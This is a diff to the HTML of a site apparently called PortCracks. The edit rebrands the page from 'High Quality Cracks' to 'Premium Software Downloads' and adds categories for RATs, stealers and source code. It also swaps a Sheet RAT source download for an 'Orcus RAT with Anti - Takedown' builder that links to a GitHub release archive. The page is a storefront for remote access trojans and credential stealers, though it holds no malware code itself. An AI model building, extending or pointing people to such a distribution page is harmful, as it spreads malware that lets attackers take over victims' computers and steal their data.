@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>portcracks</title>
+    <title>PortCracks</title>
     <style>
         :root {
             --primary: #ffffff;
@@ -129,6 +129,47 @@
             height: 20px;
             width: 20px;
             fill: currentColor;
+        }
+        
+        /* Category Heading Styles */
+        .category-heading {
+            position: relative;
+            margin: 3rem 0 2rem;
+            padding-bottom: 0.8rem;
+            font-size: 2rem;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+            font-weight: 600;
+            color: white;
+            text-shadow: 0 0 10px rgba(255, 255, 255, 0.5);
+        }
+        
+        .category-heading::after {
+            content: '';
+            position: absolute;
+            left: 0;
+            bottom: 0;
+            width: 100%;
+            height: 1px;
+            background: linear-gradient(90deg, white, transparent);
+        }
+        
+        .category-heading::before {
+            content: '';
+            position: absolute;
+            left: 0;
+            bottom: -2px;
+            width: 50px;
+            height: 3px;
+            background: white;
+            box-shadow: 0 0 10px rgba(255, 255, 255, 0.7);
+            animation: pulseWidth 4s infinite;
+        }
+        
+        @keyframes pulseWidth {
+            0% { width: 50px; }
+            50% { width: 100px; }
+            100% { width: 50px; }
         }
         
         .downloads-grid {
@@ -369,6 +410,31 @@
             position: relative;
         }
         
+        /* Navigation for categories */
+        .category-nav {
+            display: flex;
+            justify-content: center;
+            gap: 1rem;
+            flex-wrap: wrap;
+            margin: 1rem 0 2rem;
+        }
+        
+        .category-nav a {
+            padding: 0.5rem 1rem;
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 50px;
+            color: white;
+            text-decoration: none;
+            transition: all 0.3s ease;
+        }
+        
+        .category-nav a:hover {
+            background: rgba(255, 255, 255, 0.1);
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+        }
+        
         /* Floating particles */
         .particles {
             position: fixed;
@@ -422,8 +488,8 @@
     </div>
     
     <header>
-        <h1>Portcracks</h1>
-        <p class="subtitle">High Quality Cracks</p>
+        <h1>PortCracks</h1>
+        <p class="subtitle">Premium Software Downloads</p>
     </header>
     
     <main>
@@ -442,6 +508,16 @@
             </a>
         </div>
         
+        <!-- Category Navigation -->
+        <div class="category-nav">
+            <a href="#rats">Rats</a>
+            <a href="#stealers">Stealers</a>
+            <a href="#source">Source Code</a>
+            <a href="#misc">Misc</a>
+        </div>
+
+        
+        <h2 id="rats" class="category-heading">Rats</h2>
         <div class="downloads-grid">
             <!-- Download Box 1 -->
             <div class="download-box">
@@ -476,14 +552,14 @@
             <div class="download-box">
                 <div class="download-banner" style="background-image: url('/api/placeholder/400/200');"></div>
                 <div class="download-content">
-                    <h3 class="download-title">Sheet RAT Source</h3>
-                    <p class="download-description">Full source code to Sheet Rat</p>
+                    <h3 class="download-title">Orcus v1.9.1</h3>
+                    <p class="download-description">Orcus RAT with Anti - Takedown</p>
                     <div class="download-tags">
                         <span class="tag">Malware</span>
                         <span class="tag">RATs</span>
-                        <span class="tag">Source Code</span>
+                        <span class="tag">Builders</span>
                     </div>
-                    <a href="https://github.com/portcracks/ma/releases/download/ma/SheetRatSRC.zip" class="download-button">Download</a>
+                    <a href="https://github.com/portcracks/ma/releases/download/orcus/Orcus.1.9.1.Anti-Takedown.rar" class="download-button">Download</a>
                 </div>
             </div>
 
